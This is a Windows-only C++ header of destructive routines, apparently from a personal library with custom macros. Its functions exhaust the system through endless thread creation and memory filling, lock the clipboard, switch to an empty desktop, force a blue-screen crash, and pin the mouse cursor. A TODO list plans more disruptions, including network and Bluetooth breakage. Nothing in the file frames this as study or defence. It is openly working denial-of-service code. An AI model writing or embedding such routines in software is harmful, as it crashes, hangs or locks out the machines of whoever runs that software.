#pragma once

#ifdef PROG_SYS_WIN

dfa NT DumbSysBreakThdSpam()
{
    Thd thd;
    while (YES)
    {
        thd.New(
            [](GA p) -> S4 {
                ThdWait(1 << (sizb(S4) - 2));
                ret 0;
                unused(p);
            },
            NUL);
        thd.Disown();
    }
}
dfa NT DumbSysBreakMemFill()
{
    cx SI pageSize = MemPageSize();
    SI cnt = 1;
    while (YES)
    {
        GA buf = NUL;
        ife (MemNewSys(&buf, cnt * pageSize))
        {
            cnt = Max<SI>(cnt >> 1, 1);
        }
        else
        {
            ite (i, i < cnt)
                *((U1*)buf + i * pageSize) = 0;
            cnt <<= 1;
        }
    }
}
dfa NT DumbClipbBreakLock()
{
    Thd thd;
    thd.New(
        [](GA p) -> S4 {
            while (YES)
            {
                OpenClipboard(NUL);
                ThdWait(1000);
            }
            ret 0;
            unused(p);
        },
        NUL);
    thd.Disown();
}
dfa NT DumbDeskBreakVoid()
{
    SwitchDesktop(CreateDesktopW(L"DumbDeskBreakVoid", NUL, NUL, 0, DESKTOP_CREATEWINDOW | GENERIC_ALL, NUL));
}
dfa NT DumbSysStopBlue()
{
    SysBsod();
}
dfa NT DumbSysCurBreak()
{
    Thd thd;
    thd.New(
        [](GA p) -> S4 {
            while (YES)
                SysCurPosMove(Pos2<F4>(0, 0));
            ret 0;
            unused(p);
        },
        NUL);
    thd.Disown();
}

// TODO:
// DumbScnBreakSize
// DumbFileLockSelf
// DumbDirSpam
// DumbWinSpam
// DumbSndBreak
// DumbNetBreak
// DumbBluetoothBreak
// DumbPersonalBreak

#endif
